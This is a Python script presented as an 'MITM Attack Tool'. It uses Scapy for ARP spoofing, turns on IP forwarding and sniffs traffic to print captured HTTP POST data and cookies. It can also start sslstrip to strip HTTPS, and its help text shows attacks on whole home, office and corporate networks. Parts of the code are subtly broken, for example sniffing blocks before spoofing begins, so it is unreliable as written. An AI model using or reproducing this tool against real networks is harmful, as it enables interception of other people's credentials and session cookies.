#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import signal
import re
import subprocess
from scapy.all import sniff, Raw, ARP, Ether, send, srp

def enable_ip_forwarding(enable=True):
    path = "/proc/sys/net/ipv4/ip_forward"
    with open(path, "wb") as f:
        f.write(b"1\n" if enable else b"0\n")
    print("[+] IP forwarding {}".format("enabled" if enable else "disabled"))

def restore_network(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac and gateway_mac:
        send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
    print("\n[+] Restored network. Exiting...")

def get_mac(ip):
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for sent, received in answered:
        return received.hwsrc
    return None

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[-] Could not get MAC addresses. Exiting...")
        sys.exit(1)

    print("[+] Spoofing {} -> {}".format(target_ip, gateway_ip))
    try:
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_network(target_ip, gateway_ip)

def packet_callback(packet):
    try:
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            post_data = re.findall(r"(POST .*? HTTP/1\.[01].*?\r\n\r\n.*)", payload, re.S)
            cookies = re.findall(r"Cookie: (.+)", payload)

            if post_data:
                print("\n" + "=" * 50)
                print("[+] HTTP POST Data Captured:")
                print("-" * 50)
                print(post_data[0])
                
                if cookies:
                    print("-" * 50)
                    print("[+] Captured Cookies:")
                    for cookie in cookies:
                        print(cookie)
                
                print("=" * 50 + "\n")

    except Exception as e:
        print("[-] Error:", e)

def start_sniffing(interface):
    print("[+] Sniffing on {}...".format(interface))
    sniff(iface=interface, prn=packet_callback, store=0)

def kill_process_on_port(port):
    try:
        output = subprocess.check_output("netstat -tulnp | grep :{}".format(port), shell=True).decode()
        pid = [line.split()[-1].split('/')[0] for line in output.split('\n') if line][0]
        
        if pid.isdigit():
            print("[+] Port {} is in use by process {}. Terminating...".format(port, pid))
            os.system("sudo kill -9 {}".format(pid))
            print("[+] Port {} is now free.".format(port))
    except:
        print("[+] Port {} is free.".format(port))

def show_help():
    help_text = """
MITM Attack Tool - Powered by Scapy

Usage:
  python scapy_script.py -i <interface> <target_ip/network> <gateway_ip>
  python scapy_script.py -h  (to show this help message)

Examples:

  # Example 1: Attack a single device
  python scapy_script.py -i wlan0 192.168.1.100 192.168.1.1

  # Example 2: Attack a small home network (e.g., all devices on WiFi)
  python scapy_script.py  -i wlan0 192.168.1.0/24 192.168.1.1

  # Example 3: Attack a medium-sized office network
  python scapy_script.py  -i eth0 172.16.0.0/16 172.16.0.1

  # Example 4: Attack a large corporate network (dangerous)
  python scapy_script.py  -i eth0 10.0.0.0/8 10.0.0.1

Options:
  -h, --help      Show this help message and exit.
"""
    print(help_text)
    sys.exit(0)

def main():
    if len(sys.argv) == 2 and sys.argv[1] in ["-h", "--help"]:
        show_help()

    if len(sys.argv) != 5 or sys.argv[1] != "-i":
        print("Usage: python scapy_script.py  -i <interface> <target_ip/network> <gateway_ip>")
        sys.exit(1)

    interface = sys.argv[2]
    target_ip = sys.argv[3]
    gateway_ip = sys.argv[4]

    while True:
        sniff_https = input("[?] Capture HTTPS traffic as well? (yes/y or no/n): ").strip().lower()
        if sniff_https in ["y", "yes"]:
            print("[+] HTTPS sniffing enabled (requires SSLstrip)")
            kill_process_on_port(8080)
            os.system("sslstrip -k -l 8080 &")
            break
        elif sniff_https in ["n", "no"]:
            print("[+] HTTPS sniffing disabled")
            break
        else:
            print("[-] Invalid input. Please enter 'yes/y' or 'no/n'.")

    enable_ip_forwarding(True)

    start_sniffing(interface)
    arp_spoof(target_ip, gateway_ip)

def signal_handler(sig, frame):
    enable_ip_forwarding(False)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    main()
